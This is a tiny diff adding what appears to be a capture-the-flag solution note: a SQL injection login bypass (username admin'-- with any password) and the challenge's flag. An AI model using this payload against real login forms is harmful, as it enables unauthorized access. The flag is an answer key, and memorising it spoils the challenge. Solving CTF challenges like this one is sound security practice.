@@ -1,0 +1,6 @@
+SQL INJECTION
+
+username: admin'--
+password: <ANYTHING HERE>
+
+FLAG: monkeyCTF{ba5ic_5q1_inj3cti0n5}
